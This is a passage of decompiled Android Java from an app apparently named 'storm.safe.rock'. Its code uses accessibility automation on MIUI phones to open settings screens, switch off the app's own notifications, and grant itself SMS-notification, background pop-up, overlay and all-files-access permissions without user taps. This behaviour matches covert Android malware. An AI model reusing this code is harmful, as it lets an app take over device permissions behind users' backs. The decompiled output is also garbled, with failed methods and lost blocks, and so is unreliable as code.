    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:356:0x1643 -> B:338:0x15c8). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:473:0x19ce -> B:474:0x19d1). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:498:0x1a88 -> B:500:0x1a8b). Please report as a decompilation issue!!! */
    /* renamed from: b7 */
    public final java.lang.Object m212258b7(kotlin.coroutines.jvm.internal.ContinuationImpl r56) throws java.lang.Throwable {
        /*
            Method dump skipped, instructions count: 7012
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.storm.safe.rock.service.modules.yw5xud.C0367a4.m212258b7(kotlin.coroutines.jvm.internal.ContinuationImpl):java.lang.Object");
    }

    /* JADX WARN: Code restructure failed: missing block: B:40:0x00db, code lost:
    
        if (p000.b81.m210571b1(800, r2) == r3) goto L92;
     */
    /* JADX WARN: Code restructure failed: missing block: B:91:0x01ba, code lost:
    
        if (p000.b81.m210571b1(300, r2) != r3) goto L95;
     */
    /* JADX WARN: Removed duplicated region for block: B:100:0x00e5 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:105:0x014f A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:39:0x0093 A[Catch: Exception -> 0x003e, TRY_ENTER, TRY_LEAVE, TryCatch #0 {Exception -> 0x003e, blocks: (B:13:0x0039, B:39:0x0093, B:82:0x0180, B:84:0x0188, B:87:0x019b, B:90:0x01aa, B:18:0x0045, B:21:0x004e, B:24:0x0057, B:27:0x0060, B:35:0x007e), top: B:97:0x002a }] */
    /* JADX WARN: Removed duplicated region for block: B:74:0x0151 A[Catch: Exception -> 0x012b, TryCatch #2 {Exception -> 0x012b, blocks: (B:44:0x00e5, B:63:0x0126, B:66:0x0130, B:69:0x0138, B:72:0x014d, B:67:0x0134, B:68:0x0137, B:74:0x0151, B:78:0x016c, B:46:0x00ed, B:48:0x00f3, B:51:0x00fa, B:52:0x00fe, B:54:0x0104, B:56:0x0110, B:57:0x0114, B:59:0x011a), top: B:100:0x00e5, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:78:0x016c A[Catch: Exception -> 0x012b, TRY_LEAVE, TryCatch #2 {Exception -> 0x012b, blocks: (B:44:0x00e5, B:63:0x0126, B:66:0x0130, B:69:0x0138, B:72:0x014d, B:67:0x0134, B:68:0x0137, B:74:0x0151, B:78:0x016c, B:46:0x00ed, B:48:0x00f3, B:51:0x00fa, B:52:0x00fe, B:54:0x0104, B:56:0x0110, B:57:0x0114, B:59:0x011a), top: B:100:0x00e5, inners: #1 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:84:0x0188 A[Catch: Exception -> 0x003e, TryCatch #0 {Exception -> 0x003e, blocks: (B:13:0x0039, B:39:0x0093, B:82:0x0180, B:84:0x0188, B:87:0x019b, B:90:0x01aa, B:18:0x0045, B:21:0x004e, B:24:0x0057, B:27:0x0060, B:35:0x007e), top: B:97:0x002a }] */
    /* JADX WARN: Removed duplicated region for block: B:89:0x01a9  */
    /* JADX WARN: Removed duplicated region for block: B:90:0x01aa A[Catch: Exception -> 0x003e, PHI: r4 r12
      0x01aa: PHI (r4v18 int) = (r4v17 int), (r4v27 int) binds: [B:88:0x01a7, B:18:0x0045] A[DONT_GENERATE, DONT_INLINE]
      0x01aa: PHI (r12v11 com.storm.safe.rock.service.modules.yw5xud.a4) = (r12v10 com.storm.safe.rock.service.modules.yw5xud.a4), (r12v21 com.storm.safe.rock.service.modules.yw5xud.a4) binds: [B:88:0x01a7, B:18:0x0045] A[DONT_GENERATE, DONT_INLINE], TRY_LEAVE, TryCatch #0 {Exception -> 0x003e, blocks: (B:13:0x0039, B:39:0x0093, B:82:0x0180, B:84:0x0188, B:87:0x019b, B:90:0x01aa, B:18:0x0045, B:21:0x004e, B:24:0x0057, B:27:0x0060, B:35:0x007e), top: B:97:0x002a }] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:77:0x0169 -> B:94:0x01c6). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:93:0x01bd -> B:94:0x01c6). Please report as a decompilation issue!!! */
    /* renamed from: b8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212259b8(ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$executeNotificationManagerFlow$1 miuiSteps$executeNotificationManagerFlow$1;
        C0367a4 c0367a4;
        C0367a4 c0367a42;
        int i;
        int i2;
        int i3;
        int i4;
        int i5;
        if (continuationImpl instanceof MiuiSteps$executeNotificationManagerFlow$1) {
            miuiSteps$executeNotificationManagerFlow$1 = (MiuiSteps$executeNotificationManagerFlow$1) continuationImpl;
            int i6 = miuiSteps$executeNotificationManagerFlow$1.f54389a6;
            if ((i6 & Integer.MIN_VALUE) != 0) {
                miuiSteps$executeNotificationManagerFlow$1.f54389a6 = i6 - Integer.MIN_VALUE;
            } else {
                miuiSteps$executeNotificationManagerFlow$1 = new MiuiSteps$executeNotificationManagerFlow$1(this, continuationImpl);
            }
        }
        Object objM212285f0 = miuiSteps$executeNotificationManagerFlow$1.f54387a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i7 = miuiSteps$executeNotificationManagerFlow$1.f54389a6;
        try {
        } catch (Exception e) {
            e = e;
        }
        switch (i7) {
            case 0:
                kg1.m213544f4(objM212285f0);
                m212274d8("│");
                m212274d8("│ ┌─ [通知管理] 直接打开OFF频道设置 ─────────────────────");
                c0367a4 = this;
                i5 = 1;
                if (i5 < 4) {
                    c0367a4.m212274d8("│ │ 第" + i5 + "次尝试");
                    Intent intent = new Intent("android.settings.CHANNEL_NOTIFICATION_SETTINGS");
                    intent.putExtra("android.provider.extra.APP_PACKAGE", c0367a4.f55107a1.getPackageName());
                    intent.putExtra("android.provider.extra.CHANNEL_ID", "OFF");
                    intent.setFlags(276824064);
                    c0367a4.f55107a1.startActivity(intent);
                    miuiSteps$executeNotificationManagerFlow$1.f54383a0 = c0367a4;
                    miuiSteps$executeNotificationManagerFlow$1.f54384a1 = i5;
                    miuiSteps$executeNotificationManagerFlow$1.f54389a6 = 1;
                    break;
                }
                og1 og1Var = c0367a4.f55109a3;
                og1Var.m214208b0("miui_notification_page_opened");
                og1Var.m214208b0("miui_notification_switch_done");
                og1Var.m214208b0("miui_notification_category_done");
                og1Var.m214207a9(MiuiSteps$FlowType.NOTIFICATION_MANAGER);
                c0367a4.m212274d8("│ │ ✅ 通知管理完成");
                c0367a4.m212274d8("│ └──────────────────────────────────────────────────────");
                return Boolean.TRUE;
            case 1:
                i5 = miuiSteps$executeNotificationManagerFlow$1.f54384a1;
                c0367a4 = miuiSteps$executeNotificationManagerFlow$1.f54383a0;
                kg1.m213544f4(objM212285f0);
                i3 = 0;
                c0367a42 = c0367a4;
                i = i5;
                i2 = 1;
                while (true) {
                    if (i2 >= 6) {
                        try {
                        } catch (Exception e2) {
                            e = e2;
                            i7 = i;
                            c0367a4 = c0367a42;
                            AbstractC0003a2.m45c6("│ │ ❌ 异常: ", e.getMessage(), c0367a4);
                            i5 = i7 + 1;
                            if (i5 < 4) {
                            }
                            og1 og1Var2 = c0367a4.f55109a3;
                            og1Var2.m214208b0("miui_notification_page_opened");
                            og1Var2.m214208b0("miui_notification_switch_done");
                            og1Var2.m214208b0("miui_notification_category_done");
                            og1Var2.m214207a9(MiuiSteps$FlowType.NOTIFICATION_MANAGER);
                            c0367a4.m212274d8("│ │ ✅ 通知管理完成");
                            c0367a4.m212274d8("│ └──────────────────────────────────────────────────────");
                            return Boolean.TRUE;
                        }
                        AccessibilityNodeInfo rootInActiveWindow = c0367a42.f55106a0.getRootInActiveWindow();
                        if (rootInActiveWindow != null) {
                            try {
                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText("允许通知");
                                if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                    Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                                    while (it.hasNext()) {
                                        if (((AccessibilityNodeInfo) it.next()).isVisibleToUser()) {
                                            Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                                            while (it2.hasNext()) {
                                                ((AccessibilityNodeInfo) it2.next()).recycle();
                                            }
                                            rootInActiveWindow.recycle();
                                            i3 = 1;
                                        }
                                    }
                                }
                                rootInActiveWindow.recycle();
                            } catch (Throwable th) {
                                rootInActiveWindow.recycle();
                                throw th;
                            }
                        }
                        miuiSteps$executeNotificationManagerFlow$1.f54383a0 = c0367a42;
                        miuiSteps$executeNotificationManagerFlow$1.f54384a1 = i;
                        miuiSteps$executeNotificationManagerFlow$1.f54385a2 = i3;
                        miuiSteps$executeNotificationManagerFlow$1.f54386a3 = i2;
                        miuiSteps$executeNotificationManagerFlow$1.f54389a6 = 2;
                        if (b81.m210571b1(500L, miuiSteps$executeNotificationManagerFlow$1) != coroutineSingletons) {
                            i2++;
                        }
                    }
                }
                if (i3 == 0) {
                    c0367a42.m212274d8("│ │ 关闭「允许通知」开关...");
                    miuiSteps$executeNotificationManagerFlow$1.f54383a0 = c0367a42;
                    miuiSteps$executeNotificationManagerFlow$1.f54384a1 = i;
                    miuiSteps$executeNotificationManagerFlow$1.f54389a6 = 4;
                    objM212285f0 = c0367a42.m212285f0("允许通知", false, miuiSteps$executeNotificationManagerFlow$1);
                    if (objM212285f0 != coroutineSingletons) {
                        i4 = i;
                        c0367a4 = c0367a42;
                        if (!((Boolean) objM212285f0).booleanValue()) {
                            c0367a4.m212274d8("│ │ ⚠️ toggleCheckBox失败，尝试disableSwitchByText...");
                            miuiSteps$executeNotificationManagerFlow$1.f54383a0 = c0367a4;
                            miuiSteps$executeNotificationManagerFlow$1.f54384a1 = i4;
                            miuiSteps$executeNotificationManagerFlow$1.f54389a6 = 5;
                            if (c0367a4.m212250a9("允许通知", miuiSteps$executeNotificationManagerFlow$1) == coroutineSingletons) {
                            }
                        }
                        miuiSteps$executeNotificationManagerFlow$1.f54383a0 = c0367a4;
                        miuiSteps$executeNotificationManagerFlow$1.f54384a1 = i4;
                        miuiSteps$executeNotificationManagerFlow$1.f54389a6 = 6;
                        if (b81.m210571b1(50L, miuiSteps$executeNotificationManagerFlow$1) != coroutineSingletons) {
                            c0367a4.f55106a0.performGlobalAction(1);
                            miuiSteps$executeNotificationManagerFlow$1.f54383a0 = c0367a4;
                            miuiSteps$executeNotificationManagerFlow$1.f54384a1 = i4;
                            miuiSteps$executeNotificationManagerFlow$1.f54389a6 = 7;
                            break;
                        }
                    }
                } else {
                    c0367a42.m212274d8("│ │ ⚠️ 未进入频道设置页，重试");
                    c0367a42.f55106a0.performGlobalAction(1);
                    miuiSteps$executeNotificationManagerFlow$1.f54383a0 = c0367a42;
                    miuiSteps$executeNotificationManagerFlow$1.f54384a1 = i;
                    miuiSteps$executeNotificationManagerFlow$1.f54389a6 = 3;
                    if (b81.m210571b1(300L, miuiSteps$executeNotificationManagerFlow$1) != coroutineSingletons) {
                        i7 = i;
                        c0367a4 = c0367a42;
                        i5 = i7 + 1;
                        if (i5 < 4) {
                        }
                        og1 og1Var22 = c0367a4.f55109a3;
                        og1Var22.m214208b0("miui_notification_page_opened");
                        og1Var22.m214208b0("miui_notification_switch_done");
                        og1Var22.m214208b0("miui_notification_category_done");
                        og1Var22.m214207a9(MiuiSteps$FlowType.NOTIFICATION_MANAGER);
                        c0367a4.m212274d8("│ │ ✅ 通知管理完成");
                        c0367a4.m212274d8("│ └──────────────────────────────────────────────────────");
                        return Boolean.TRUE;
                    }
                }
                return coroutineSingletons;
            case 2:
                int i8 = miuiSteps$executeNotificationManagerFlow$1.f54386a3;
                int i9 = miuiSteps$executeNotificationManagerFlow$1.f54385a2;
                int i10 = miuiSteps$executeNotificationManagerFlow$1.f54384a1;
                C0367a4 c0367a43 = miuiSteps$executeNotificationManagerFlow$1.f54383a0;
                try {
                    kg1.m213544f4(objM212285f0);
                    i3 = i9;
                    i = i10;
                    c0367a42 = c0367a43;
                    i2 = i8 + 1;
                } catch (Exception e3) {
                    e = e3;
                    i7 = i10;
                    c0367a4 = c0367a43;
                    AbstractC0003a2.m45c6("│ │ ❌ 异常: ", e.getMessage(), c0367a4);
                    i5 = i7 + 1;
                    if (i5 < 4) {
                    }
                    og1 og1Var222 = c0367a4.f55109a3;
                    og1Var222.m214208b0("miui_notification_page_opened");
                    og1Var222.m214208b0("miui_notification_switch_done");
                    og1Var222.m214208b0("miui_notification_category_done");
                    og1Var222.m214207a9(MiuiSteps$FlowType.NOTIFICATION_MANAGER);
                    c0367a4.m212274d8("│ │ ✅ 通知管理完成");
                    c0367a4.m212274d8("│ └──────────────────────────────────────────────────────");
                    return Boolean.TRUE;
                }
                while (true) {
                    if (i2 >= 6) {
                    }
                    i2++;
                }
                if (i3 == 0) {
                }
                return coroutineSingletons;
            case 3:
                i7 = miuiSteps$executeNotificationManagerFlow$1.f54384a1;
                c0367a4 = miuiSteps$executeNotificationManagerFlow$1.f54383a0;
                kg1.m213544f4(objM212285f0);
                i5 = i7 + 1;
                if (i5 < 4) {
                }
                og1 og1Var2222 = c0367a4.f55109a3;
                og1Var2222.m214208b0("miui_notification_page_opened");
                og1Var2222.m214208b0("miui_notification_switch_done");
                og1Var2222.m214208b0("miui_notification_category_done");
                og1Var2222.m214207a9(MiuiSteps$FlowType.NOTIFICATION_MANAGER);
                c0367a4.m212274d8("│ │ ✅ 通知管理完成");
                c0367a4.m212274d8("│ └──────────────────────────────────────────────────────");
                return Boolean.TRUE;
            case 4:
                i4 = miuiSteps$executeNotificationManagerFlow$1.f54384a1;
                c0367a4 = miuiSteps$executeNotificationManagerFlow$1.f54383a0;
                kg1.m213544f4(objM212285f0);
                if (!((Boolean) objM212285f0).booleanValue()) {
                }
                miuiSteps$executeNotificationManagerFlow$1.f54383a0 = c0367a4;
                miuiSteps$executeNotificationManagerFlow$1.f54384a1 = i4;
                miuiSteps$executeNotificationManagerFlow$1.f54389a6 = 6;
                if (b81.m210571b1(50L, miuiSteps$executeNotificationManagerFlow$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
                i4 = miuiSteps$executeNotificationManagerFlow$1.f54384a1;
                c0367a4 = miuiSteps$executeNotificationManagerFlow$1.f54383a0;
                kg1.m213544f4(objM212285f0);
                miuiSteps$executeNotificationManagerFlow$1.f54383a0 = c0367a4;
                miuiSteps$executeNotificationManagerFlow$1.f54384a1 = i4;
                miuiSteps$executeNotificationManagerFlow$1.f54389a6 = 6;
                if (b81.m210571b1(50L, miuiSteps$executeNotificationManagerFlow$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                i4 = miuiSteps$executeNotificationManagerFlow$1.f54384a1;
                c0367a4 = miuiSteps$executeNotificationManagerFlow$1.f54383a0;
                kg1.m213544f4(objM212285f0);
                c0367a4.f55106a0.performGlobalAction(1);
                miuiSteps$executeNotificationManagerFlow$1.f54383a0 = c0367a4;
                miuiSteps$executeNotificationManagerFlow$1.f54384a1 = i4;
                miuiSteps$executeNotificationManagerFlow$1.f54389a6 = 7;
                break;
            case 7:
                int i11 = miuiSteps$executeNotificationManagerFlow$1.f54384a1;
                c0367a4 = miuiSteps$executeNotificationManagerFlow$1.f54383a0;
                kg1.m213544f4(objM212285f0);
                og1 og1Var22222 = c0367a4.f55109a3;
                og1Var22222.m214208b0("miui_notification_page_opened");
                og1Var22222.m214208b0("miui_notification_switch_done");
                og1Var22222.m214208b0("miui_notification_category_done");
                og1Var22222.m214207a9(MiuiSteps$FlowType.NOTIFICATION_MANAGER);
                c0367a4.m212274d8("│ │ ✅ 通知管理完成");
                c0367a4.m212274d8("│ └──────────────────────────────────────────────────────");
                return Boolean.TRUE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:34:0x0126  */
    /* JADX WARN: Removed duplicated region for block: B:35:0x013c  */
    /* JADX WARN: Removed duplicated region for block: B:40:0x0187  */
    /* JADX WARN: Removed duplicated region for block: B:41:0x0189  */
    /* JADX WARN: Removed duplicated region for block: B:44:0x0195  */
    /* JADX WARN: Removed duplicated region for block: B:47:0x01a4  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x01a7  */
    /* JADX WARN: Removed duplicated region for block: B:51:0x01bd  */
    /* JADX WARN: Removed duplicated region for block: B:57:0x01d7  */
    /* JADX WARN: Removed duplicated region for block: B:58:0x01d9  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* renamed from: b9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212260b9(String str, ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$executeOverlayAndPopupPermissions$1 miuiSteps$executeOverlayAndPopupPermissions$1;
        long jCurrentTimeMillis;
        C0367a4 c0367a4;
        int i;
        boolean zBooleanValue;
        int i2;
        boolean z;
        long jCurrentTimeMillis2;
        boolean z2;
        int i3;
        boolean zBooleanValue2;
        if (continuationImpl instanceof MiuiSteps$executeOverlayAndPopupPermissions$1) {
            miuiSteps$executeOverlayAndPopupPermissions$1 = (MiuiSteps$executeOverlayAndPopupPermissions$1) continuationImpl;
            int i4 = miuiSteps$executeOverlayAndPopupPermissions$1.f54396a6;
            if ((i4 & Integer.MIN_VALUE) != 0) {
                miuiSteps$executeOverlayAndPopupPermissions$1.f54396a6 = i4 - Integer.MIN_VALUE;
            } else {
                miuiSteps$executeOverlayAndPopupPermissions$1 = new MiuiSteps$executeOverlayAndPopupPermissions$1(this, continuationImpl);
            }
        }
        Object objM212256b5 = miuiSteps$executeOverlayAndPopupPermissions$1.f54394a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i5 = miuiSteps$executeOverlayAndPopupPermissions$1.f54396a6;
        if (i5 == 0) {
            kg1.m213544f4(objM212256b5);
            m212274d8("│");
            m212274d8("│ ┌─ [步骤18] 后台弹出/文件权限 ───────────────────");
            m212274d8("│ │ 📋 包含两个子步骤:");
            m212274d8("│ │   18.1 权限管理（通知类短信/后台弹出/悬浮窗）");
            m212274d8("│ │   18.2 所有文件管理权限 (Android 11+)");
            m212274d8("│ │");
            m212274d8("│ │ ┌─ [18.1] 权限管理（三合一）─────────────────────");
            m212274d8("│ │ │ 🎯 目标: 通知类短信 + 后台弹出界面 + 显示悬浮窗");
            jCurrentTimeMillis = System.currentTimeMillis();
            miuiSteps$executeOverlayAndPopupPermissions$1.f54390a0 = this;
            miuiSteps$executeOverlayAndPopupPermissions$1.f54391a1 = 1;
            miuiSteps$executeOverlayAndPopupPermissions$1.f54392a2 = jCurrentTimeMillis;
            miuiSteps$executeOverlayAndPopupPermissions$1.f54396a6 = 1;
            objM212256b5 = m212256b5(miuiSteps$executeOverlayAndPopupPermissions$1);
            if (objM212256b5 != coroutineSingletons) {
                c0367a4 = this;
                i = 1;
            }
            return coroutineSingletons;
        }
        if (i5 != 1) {
            if (i5 != 2) {
                if (i5 != 3) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                i3 = miuiSteps$executeOverlayAndPopupPermissions$1.f54391a1;
                kg1.m213544f4(objM212256b5);
                i2 = i3;
                return Boolean.valueOf(i2 == 0);
            }
            jCurrentTimeMillis2 = miuiSteps$executeOverlayAndPopupPermissions$1.f54392a2;
            z2 = miuiSteps$executeOverlayAndPopupPermissions$1.f54393a3;
            i2 = miuiSteps$executeOverlayAndPopupPermissions$1.f54391a1;
            c0367a4 = miuiSteps$executeOverlayAndPopupPermissions$1.f54390a0;
            kg1.m213544f4(objM212256b5);
            zBooleanValue2 = ((Boolean) objM212256b5).booleanValue();
            long jCurrentTimeMillis3 = System.currentTimeMillis() - jCurrentTimeMillis2;
            if (zBooleanValue2) {
                c0367a4.m212274d8("│ │ │ ❌ 所有文件管理权限设置失败 (" + jCurrentTimeMillis3 + "ms)");
                i2 = 0;
            } else {
                c0367a4.m212274d8("│ │ │ ✅ 所有文件管理权限设置成功 (" + jCurrentTimeMillis3 + "ms)");
            }
            c0367a4.m212274d8("│ │ └─────────────────────────────────────────────");
            boolean z3 = z2;
            z = zBooleanValue2;
            zBooleanValue = z3;
            c0367a4.m212274d8("│ │");
            c0367a4.m212274d8("│ │ 📊 步骤18 子步骤结果:");
            c0367a4.m212274d8("│ │   18.1 权限管理:       ".concat(zBooleanValue ? "✅" : "❌"));
            c0367a4.m212274d8("│ │   18.2 文件管理权限:   ".concat(z ? "✅" : "❌"));
            c0367a4.m212274d8("│ │");
            c0367a4.m212274d8("│ │ ".concat(i2 != 0 ? "✅ 步骤18 全部完成" : "⚠️ 步骤18 部分失败"));
            c0367a4.m212274d8("│ └──────────────────────────────────────────────────────");
            if (Build.VERSION.SDK_INT <= 28) {
                c0367a4.m212274d8("│");
                c0367a4.m212274d8("│ ┌─ [Android 9及以下] 步骤18完成后智能返回应用 ─────────");
                miuiSteps$executeOverlayAndPopupPermissions$1.f54390a0 = null;
                miuiSteps$executeOverlayAndPopupPermissions$1.f54391a1 = i2;
                miuiSteps$executeOverlayAndPopupPermissions$1.f54396a6 = 3;
                if (c0367a4.m212283e8(miuiSteps$executeOverlayAndPopupPermissions$1) != coroutineSingletons) {
                    i3 = i2;
                    i2 = i3;
                }
                return coroutineSingletons;
            }
            return Boolean.valueOf(i2 == 0);
        }
        jCurrentTimeMillis = miuiSteps$executeOverlayAndPopupPermissions$1.f54392a2;
        i = miuiSteps$executeOverlayAndPopupPermissions$1.f54391a1;
        c0367a4 = miuiSteps$executeOverlayAndPopupPermissions$1.f54390a0;
        kg1.m213544f4(objM212256b5);
        zBooleanValue = ((Boolean) objM212256b5).booleanValue();
        long jCurrentTimeMillis4 = System.currentTimeMillis() - jCurrentTimeMillis;
        if (zBooleanValue) {
            c0367a4.m212274d8("│ │ │ ✅ 权限管理设置成功 (" + jCurrentTimeMillis4 + "ms)");
        } else {
            c0367a4.m212274d8("│ │ │ ❌ 权限管理设置失败 (" + jCurrentTimeMillis4 + "ms)");
            i = 0;
        }
        c0367a4.m212274d8("│ │ └─────────────────────────────────────────────");
        int i6 = Build.VERSION.SDK_INT;
        if (i6 < 30) {
            c0367a4.m212274d8("│ │");
            c0367a4.m212274d8("│ │ ⏭️ [18.3] 跳过所有文件管理权限");
            c0367a4.m212274d8("│ │   📋 原因: Android版本 " + i6 + " < 30，不需要此权限");
            i2 = i;
            z = true;
            c0367a4.m212274d8("│ │");
            c0367a4.m212274d8("│ │ 📊 步骤18 子步骤结果:");
            c0367a4.m212274d8("│ │   18.1 权限管理:       ".concat(zBooleanValue ? "✅" : "❌"));
            c0367a4.m212274d8("│ │   18.2 文件管理权限:   ".concat(z ? "✅" : "❌"));
            c0367a4.m212274d8("│ │");
            c0367a4.m212274d8("│ │ ".concat(i2 != 0 ? "✅ 步骤18 全部完成" : "⚠️ 步骤18 部分失败"));
            c0367a4.m212274d8("│ └──────────────────────────────────────────────────────");
            if (Build.VERSION.SDK_INT <= 28) {
            }
            return Boolean.valueOf(i2 == 0);
        }
        c0367a4.m212274d8("│ │");
        c0367a4.m212274d8("│ │ ┌─ [18.2] 所有文件管理权限 ─────────────────────");
        c0367a4.m212274d8("│ │ │ 🎯 目标: 开启所有文件访问权限");
        c0367a4.m212274d8("│ │ │ 📋 Android版本: " + i6 + " (≥30, 需要此权限)");
        jCurrentTimeMillis2 = System.currentTimeMillis();
        miuiSteps$executeOverlayAndPopupPermissions$1.f54390a0 = c0367a4;
        miuiSteps$executeOverlayAndPopupPermissions$1.f54391a1 = i;
        miuiSteps$executeOverlayAndPopupPermissions$1.f54393a3 = zBooleanValue;
        miuiSteps$executeOverlayAndPopupPermissions$1.f54392a2 = jCurrentTimeMillis2;
        miuiSteps$executeOverlayAndPopupPermissions$1.f54396a6 = 2;
        Object objM212254b3 = c0367a4.m212254b3(miuiSteps$executeOverlayAndPopupPermissions$1);
        if (objM212254b3 != coroutineSingletons) {
            int i7 = i;
            z2 = zBooleanValue;
            objM212256b5 = objM212254b3;
            i2 = i7;
            zBooleanValue2 = ((Boolean) objM212256b5).booleanValue();
            long jCurrentTimeMillis32 = System.currentTimeMillis() - jCurrentTimeMillis2;
            if (zBooleanValue2) {
            }
            c0367a4.m212274d8("│ │ └─────────────────────────────────────────────");
            boolean z32 = z2;
            z = zBooleanValue2;
            zBooleanValue = z32;
            c0367a4.m212274d8("│ │");
            c0367a4.m212274d8("│ │ 📊 步骤18 子步骤结果:");
            c0367a4.m212274d8("│ │   18.1 权限管理:       ".concat(zBooleanValue ? "✅" : "❌"));
            c0367a4.m212274d8("│ │   18.2 文件管理权限:   ".concat(z ? "✅" : "❌"));
            c0367a4.m212274d8("│ │");
            c0367a4.m212274d8("│ │ ".concat(i2 != 0 ? "✅ 步骤18 全部完成" : "⚠️ 步骤18 部分失败"));
            c0367a4.m212274d8("│ └──────────────────────────────────────────────────────");
            if (Build.VERSION.SDK_INT <= 28) {
            }
            return Boolean.valueOf(i2 == 0);
        }
        return coroutineSingletons;
    }

    /*  JADX ERROR: Types fix failed
        jadx.core.utils.exceptions.JadxOverflowException: Type update terminated with stack overflow, arg: (r6v251 java.lang.Object), method size: 8262
        	at jadx.core.utils.ErrorsCounter.addError(ErrorsCounter.java:59)
        	at jadx.core.utils.ErrorsCounter.error(ErrorsCounter.java:31)
        	at jadx.core.dex.attributes.nodes.NotificationAttrNode.addError(NotificationAttrNode.java:19)
        	at jadx.core.dex.visitors.typeinference.FixTypesVisitor.visit(FixTypesVisitor.java:96)
        */
    /* JADX WARN: Not initialized variable reg: 49, insn: 0x0a76: MOVE (r27 I:??[OBJECT, ARRAY]) = (r49 I:??[OBJECT, ARRAY]), block:B:315:0x0a60 */
    /* JADX WARN: Not initialized variable reg: 50, insn: 0x0a78: MOVE (r33 I:??[OBJECT, ARRAY]) = (r50 I:??[OBJECT, ARRAY]), block:B:315:0x0a60 */
    /* JADX WARN: Not initialized variable reg: 51, insn: 0x0a7a: MOVE (r34 I:??[OBJECT, ARRAY]) = (r51 I:??[OBJECT, ARRAY]), block:B:315:0x0a60 */
    /* JADX WARN: Not initialized variable reg: 54, insn: 0x0a7c: MOVE (r64 I:??[OBJECT, ARRAY]) = (r54 I:??[OBJECT, ARRAY]), block:B:315:0x0a60 */
    /* JADX WARN: Not initialized variable reg: 60, insn: 0x0a7e: MOVE (r5 I:??[OBJECT, ARRAY]) = (r60 I:??[OBJECT, ARRAY]), block:B:315:0x0a60 */
    /* JADX WARN: Not initialized variable reg: 61, insn: 0x0a80: MOVE (r8 I:??[OBJECT, ARRAY]) = (r61 I:??[OBJECT, ARRAY]), block:B:315:0x0a60 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:1030:0x1e84 -> B:1046:0x1ed5). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:1040:0x1ec3 -> B:1041:0x1ec7). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:1049:0x1edd -> B:1050:0x1eef). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:523:0x0f59 -> B:524:0x0f5b). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:554:0x0fed -> B:555:0x100d). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:632:0x1315 -> B:1225:0x131e). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:662:0x13d3 -> B:1293:0x13da). Please report as a decompilation issue!!! */
    /* renamed from: c0 */
    public final java.lang.Object m212261c0(kotlin.coroutines.jvm.internal.ContinuationImpl r67) throws java.lang.Throwable {
        /*
            Method dump skipped, instructions count: 8262
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.storm.safe.rock.service.modules.yw5xud.C0367a4.m212261c0(kotlin.coroutines.jvm.internal.ContinuationImpl):java.lang.Object");
    }

    /* JADX WARN: Code restructure failed: missing block: B:35:0x00e6, code lost:
    
        if (p000.b81.m210571b1(50, r0) == r1) goto L36;
     */
    /* JADX WARN: Removed duplicated region for block: B:19:0x0052  */
    /* JADX WARN: Removed duplicated region for block: B:38:0x00ec  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:20:0x0058 -> B:37:0x00e9). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:35:0x00e6 -> B:37:0x00e9). Please report as a decompilation issue!!! */
    /* renamed from: c1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212262c1(ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$findAndClickAnySwitch$1 miuiSteps$findAndClickAnySwitch$1;
        C0367a4 c0367a4;
        int i;
        AccessibilityNodeInfo accessibilityNodeInfo;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        float f;
        float f2;
        C0367a4 c0367a42;
        if (continuationImpl instanceof MiuiSteps$findAndClickAnySwitch$1) {
            miuiSteps$findAndClickAnySwitch$1 = (MiuiSteps$findAndClickAnySwitch$1) continuationImpl;
            int i2 = miuiSteps$findAndClickAnySwitch$1.f54415a8;
            if ((i2 & Integer.MIN_VALUE) != 0) {
